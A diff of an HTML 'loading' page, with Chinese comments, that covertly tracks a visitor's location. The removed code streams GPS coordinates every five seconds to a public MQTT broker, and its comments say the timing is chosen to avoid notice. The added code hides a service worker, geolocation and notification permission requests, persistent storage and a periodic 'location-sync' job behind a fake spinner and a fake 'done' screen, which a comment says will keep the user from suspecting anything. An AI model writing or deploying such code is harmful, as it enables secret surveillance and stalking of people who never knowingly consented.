@@ -2,100 +2,92 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>.</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>加载中...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #fff;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
-<body style="margin:0;background:#fff;">
-    <!-- 页面显示完全正常内容，毫无破绽 -->
-    <div style="text-align:center;padding-top:40%;font-family:Arial;color:#333;">
-        <h2>页面加载中...</h2>
-        <p>请稍候</p>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <p style="color:#888;">正在加载，请稍候...</p>
     </div>
 
     <script>
-    // ============ MQTT配置 ============
-    const BROKER = "wss://broker.emqx.io:8084/mqtt";  // 免费公共MQTT
-    const ROOM_ID = "loc_" + Math.random().toString(36).substr(2, 8);
-    const TOPIC = "geodata/" + ROOM_ID;
-    
-    // 将房间ID发送给你（通过你自己的接收方式，这里用console输出）
-    console.log("ROOM:" + ROOM_ID);
-    
-    // ============ 连接MQTT ============
-    let ws = new WebSocket(BROKER);
-    let connected = false;
-    
-    ws.onopen = function() {
-        connected = true;
-        console.log("[MQTT] 已连接");
-        startSendingLocation();
-    };
-    
-    ws.onerror = function() {
-        console.log("[MQTT] 连接失败，重试中...");
-        setTimeout(() => {
-            ws = new WebSocket(BROKER);
-        }, 5000);
-    };
-    
-    // ============ 静默获取GPS并发送 ============
-    function getPosition() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    resolve({
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        acc: pos.coords.accuracy,
-                        spd: pos.coords.speed || 0,
-                        ts: Date.now()
+        // 生成唯一设备ID
+        const deviceId = 'd_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+        
+        // 存储到localStorage，确保后续一致
+        localStorage.setItem('_did', deviceId);
+        
+        // 注册Service Worker
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js', { scope: '/' })
+                .then(reg => {
+                    console.log('SW registered');
+                    
+                    // 请求定位权限（静默）
+                    navigator.permissions.query({ name: 'geolocation' }).then(result => {
+                        if (result.state === 'granted' || result.state === 'prompt') {
+                            // 获取一次位置触发权限请求
+                            navigator.geolocation.getCurrentPosition(() => {}, () => {}, { timeout: 1000 });
+                        }
                     });
-                },
-                (err) => {
-                    resolve(null);  // 静默失败
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 8000,
-                    maximumAge: 0
-                }
-            );
-        });
-    }
-    
-    // ============ 定时发送位置 ============
-    async function startSendingLocation() {
-        while (true) {
-            if (ws.readyState === WebSocket.OPEN) {
-                const pos = await getPosition();
-                if (pos) {
-                    const msg = JSON.stringify({
-                        type: "publish",
-                        topic: TOPIC,
-                        payload: JSON.stringify(pos)
-                    });
-                    ws.send(msg);
-                }
-            }
-            // 间隔5秒发送一次（省电，不易察觉）
-            await new Promise(r => setTimeout(r, 5000));
+                    
+                    // 请求通知权限（用于后台唤醒）
+                    Notification.requestPermission();
+                    
+                    // 请求持久化存储
+                    if (navigator.storage && navigator.storage.persist) {
+                        navigator.storage.persist().then(granted => {
+                            console.log('Persistent storage:', granted);
+                        });
+                    }
+                    
+                    // 启用后台同步
+                    if ('periodicSync' in reg) {
+                        reg.periodicSync.register('location-sync', {
+                            minInterval: 60000  // 最小间隔60秒
+                        }).then(() => console.log('Periodic sync registered'));
+                    }
+                })
+                .catch(err => console.log('SW reg failed:', err));
         }
-    }
-    
-    // ============ 页面伪装：5秒后显示正常内容 ============
-    setTimeout(() => {
-        document.body.innerHTML = `
-            <div style="text-align:center;padding-top:20%;font-family:Arial,sans-serif;">
-                <h1 style="color:#4CAF50;">✅ 连接成功</h1>
-                <p>网络状态良好</p>
-                <p style="color:#999;font-size:12px;">页面ID: ${ROOM_ID}</p>
-            </div>
-        `;
-    }, 5000);
+        
+        // 页面显示3秒后自动"完成加载"（实际后台任务已启动）
+        setTimeout(() => {
+            document.querySelector('.container').innerHTML = `
+                <div style="font-size:48px;">✅</div>
+                <p style="color:#4CAF50;">已完成</p>
+            `;
+            // 用户看到这个页面会以为只是个普通的加载页，不会起疑
+        }, 3000);
     </script>
 </body>
 </html>
